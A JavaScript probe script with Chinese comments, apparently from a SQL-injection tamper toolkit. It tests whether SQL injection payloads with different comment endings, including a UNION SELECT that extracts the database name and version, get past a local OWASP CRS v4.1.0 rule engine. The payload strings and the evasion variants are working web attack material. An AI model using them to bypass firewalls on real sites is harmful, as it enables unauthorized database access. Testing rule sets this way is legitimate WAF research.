// 探测：通用注释形态（-- 尾空格）与 # 在 CRS v4.1.0 下的通过性对比
// 目标：验证 commentcompact（-- - → -- ）作为全方言通用替代的可行性
import { evaluate } from './crs-engine.js';
import { pathToFileURL } from 'node:url';
import { resolve } from 'node:path';

const ROOT = resolve(import.meta.dirname, '../..');
const { applyTampers } = await import(pathToFileURL(resolve(ROOT, 'server/src/core/tamper/applyTampers.js')).href);

const SAMPLES = [
  "1' AND 1=1-- -",
  "alice' AND 1=1-- -",
  "keyboard%' AND 1=1-- -",
  "1' UNION SELECT 2,database(),version()-- -",
  "1 AND 1=1-- -",
];

// 手工构造三种尾部形态：原始 / #（MySQL系）/ -- （通用）
function variants(p) {
  const base = p.replace(/-- -$/, '');
  return [
    ['原始 -- -', base + '-- -'],
    ['#（MySQL系）', base + '#'],
    ['--（通用尾空格）', base + '-- '],
    ['--x（注释带词）', base + '--x'],
  ];
}

function test(p, param = 'id') {
  return evaluate({ uri: `/${param}?${param}=1`, queryString: `${param}=1`, args: { [param]: p }, cookies: {}, headers: {} });
}

let allPass = true;
for (const p of SAMPLES) {
  console.log(`\n样本: ${p}`);
  for (const [label, v] of variants(p)) {
    const r = test(v);
    if (label.includes('通用') && r.blocked) allPass = false;
    console.log(`  ${r.blocked ? '拦(' + r.ruleId + ')' : '过'}  [${label}]  |${v}|`);
  }
}
console.log(`\n结论：通用形态（-- 尾空格）${allPass ? '全部通过 CRS ✅' : '存在拦截 ❌'}`);
